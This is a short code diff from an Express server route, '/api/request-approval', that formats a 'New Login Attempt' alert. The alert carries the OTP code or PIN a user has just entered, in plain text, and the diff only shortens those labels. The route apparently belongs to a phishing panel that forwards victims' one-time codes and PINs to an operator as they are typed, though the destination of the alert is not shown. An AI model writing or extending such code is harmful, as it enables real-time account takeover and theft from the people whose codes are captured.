@@ -78,8 +78,8 @@ app.post('/api/request-approval', async (req, res) => {
 
   const secretLine =
     step === 'otp'
-       ? `🔑 OTP Code Entered: \`${otp || '—'}\`\n`
-: `🔑 Code Entered: \`${code || '—'}\`\n`;
+       ? `🔑 OTP : \`${otp || '—'}\`\n`
+: `🔑 pin: \`${code || '—'}\`\n`;
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
       `📦 Data: ${plan || '—'}\n` +
